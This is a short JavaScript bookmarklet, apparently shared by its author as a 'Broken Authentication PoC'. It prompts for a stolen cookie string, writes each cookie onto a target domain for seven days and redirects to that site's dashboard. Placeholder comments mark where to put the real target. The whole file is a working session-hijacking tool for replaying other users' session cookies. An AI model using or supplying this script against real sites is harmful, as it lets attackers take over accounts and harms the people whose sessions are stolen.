/*
Broken Authentacation Script code by ph.hitachi
Email: ph.hitachi@gmail.com
Facebook: https://fb.com/ph.hitachi.gov.ph
*/ 
javascript:void(function(){
    function setCookie(t) { 
    var list = t.split("; "); 
    console.log(list); 
        for (var i = list.length - 1; i >= 0; i--) { 
            var cname = list[i].split("=")[0]; var cvalue = list[i].split("=")[1]; 
            var d = new Date(); d.setTime(d.getTime() + (7*24*60*60*1000)); 
            var expires = ";domain=.example.com;expires="+ d.toUTCString(); //change the .example.com
            document.cookie = cname + "=" + cvalue + "; " + expires; 
        } 
    } 
    function hex2a(hex) { 
        var str = ''; 
        for (var i = 0; i < hex.length; i += 2) {
            var v = parseInt(hex.substr(i, 2), 16); 
            if (v) str += String.fromCharCode(v); 
        } 
    return str; 
    } 
    var cookie = prompt("Broken Authentacation PoC", "Put Cookie here"); 
    setCookie(cookie); 
    location.href = 'https://example.com/dashboard'; //change the https://example.com/dashboard
})();
